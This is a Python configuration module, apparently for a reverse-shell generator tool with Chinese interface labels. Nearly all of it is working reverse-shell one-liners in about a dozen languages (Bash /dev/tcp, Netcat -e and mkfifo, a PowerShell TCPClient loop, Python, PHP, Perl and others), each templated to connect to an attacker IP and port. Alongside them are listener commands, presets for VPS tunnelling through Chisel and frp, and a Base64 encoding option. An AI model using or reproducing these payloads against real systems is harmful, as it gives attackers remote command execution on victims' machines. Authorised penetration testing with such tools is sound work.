PAYLOADS = {
    "Bash": {
        "reverse": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "reverse_mkfifo": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
    },
    "Python": {
        "reverse": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
    },
    "PHP": {
        "reverse": "php -r '$s=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'",
    },
    "PowerShell": {
        "reverse": """$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+$(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}""",
    },
    "Netcat": {
        "reverse_e": "nc -e /bin/sh {ip} {port}",
        "reverse_mkfifo": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
        "ncat_ssl": "ncat --ssl -e /bin/sh {ip} {port}",
    },
    "Perl": {
        "reverse": """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
    },
    "Ruby": {
        "reverse": """ruby -rsocket -e 'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
    },
    "Java": {
        "reverse": """Runtime rt = Runtime.getRuntime();String[] cmd = {{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}};rt.exec(cmd);""",
    },
    "Go": {
        "reverse": """package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}""",
    },
    "Lua": {
        "reverse": """lua -e 'require("socket");require("os");t=socket.tcp();t:connect("{ip}","{port}");os.execute("/bin/sh -i <&3 >&3 2>&3");'""",
    },
    "Awk": {
        "reverse": """awk 'BEGIN{{s="/inet/tcp/0/{ip}/{port}";while(1){{do{{printf "$ "|&s;s|&getline c;if(c){{while((c|&getline)>0)print$0|&s;close(c)}}}}while(c!="exit")}}}}'""",
    },
}

ALL_LANG_LIST = list(PAYLOADS.keys())
COMMON_LANG_LIST = ["Bash", "Python", "PHP", "PowerShell", "Netcat"]

LISTENER_TYPES = [
    ("nc",        "nc -lvn {port}"),
    ("ncat",      "ncat -lvnp {port}"),
    ("ncat+ssl",  "ncat --ssl -lvnp {port}"),
    ("rlwrap nc", "rlwrap nc -lvn {port}"),
    ("socat",     "socat TCP-LISTEN:{port},reuseaddr,fork SYSTEM:'sh',pty,stderr"),
]

PRESET_LIST = [
    "自定义",
    "本地 Bash",
    "本地 Python",
    "Windows PowerShell",
    "VPS Chisel",
    "VPS frp",
]

PRESET_VALUES = {
    "本地 Bash": {
        "ip": "AUTO",
        "port": "4444",
        "lang": "Bash",
        "variant": "默认",
        "encode": "无编码",
        "listener_type": "nc",
        "listener_port": "4444",
    },
    "本地 Python": {
        "ip": "AUTO",
        "port": "4444",
        "lang": "Python",
        "variant": "默认",
        "encode": "无编码",
        "listener_type": "ncat",
        "listener_port": "4444",
    },
    "Windows PowerShell": {
        "ip": "AUTO",
        "port": "4444",
        "lang": "PowerShell",
        "variant": "默认",
        "encode": "无编码",
        "listener_type": "ncat",
        "listener_port": "4444",
    },
    "VPS Chisel": {
        "vps_method": "Chisel",
        "vps_port": "4444",
        "local_port": "4444",
    },
    "VPS frp": {
        "vps_method": "frp",
        "vps_port": "4444",
        "local_port": "4444",
    },
}

ENCODE_LIST = ["无编码", "Base64"]
FRP_CONTROL_PORT = "7000"
CHISEL_CONTROL_PORT = "8080"


def variant_label(key):
    label = key.replace("reverse_", "").replace("_", " ").replace("reverse", "默认").strip()
    return (label or "默认").title()
